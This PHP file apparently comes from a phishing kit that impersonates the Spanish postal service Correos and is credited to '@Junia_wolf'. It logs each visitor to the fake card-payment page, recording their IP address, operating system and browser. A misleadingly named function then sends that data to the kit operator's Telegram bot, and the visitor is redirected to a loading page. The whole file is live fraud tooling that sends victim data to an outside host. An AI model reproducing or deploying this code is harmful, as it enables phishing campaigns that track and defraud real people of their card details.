<?php
/*

        $$   $$    $$   $$$     $$   $$$$$$      $$$$$     
        $$   $$    $$   $$ $$   $$     $$      $$     $$
        $$   $$    $$   $$  $$  $$     $$     $$       $$ 
        $$   $$    $$   $$   $$ $$     $$     $$$$$$$$$$$
    $$  $$   $$    $$   $$    $$$$     $$     $$       $$
    $$$$$$    $$$$$$    $$     $$$   $$$$$$   $$       $$  
                                                            


*/

    include("server.php");
    include("../junia-telegram.php");
    $OS = getOS($_SERVER['HTTP_USER_AGENT']); 
    $UserAgent =$_SERVER['HTTP_USER_AGENT'];
    $browser = explode(')',$UserAgent);				
    $_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	


    $ip = $_SERVER['REMOTE_ADDR'];
    $message ="
    ========= 🇪🇸 Correos-Visiter_cc 🇪🇸  =============
    [IP]    : "."https://www.geodatatool.com/en/?ip=".$ip."
    [Visiter]      : wjed rassek am3elem visiter f page d cc
    [OS] = ".$OS."
    [👨‍💻 Coded] : "."By @Junia_wolf"."
    -------==--- 🇪🇸 Correos_Visiter 🇪🇸 --==---------\n";


    function antiBotsCaller($messaggio,$token,$chatid) {
        $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
        $url = $url . "&text=" . urlencode($messaggio);
        $ch = curl_init();
        $optArray = array(
                CURLOPT_URL => $url,
                CURLOPT_RETURNTRANSFER => true
        );
        curl_setopt_array($ch, $optArray);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    antiBotsCaller($message,$token,$chatid);
    header("Location: ../loading.php");

?>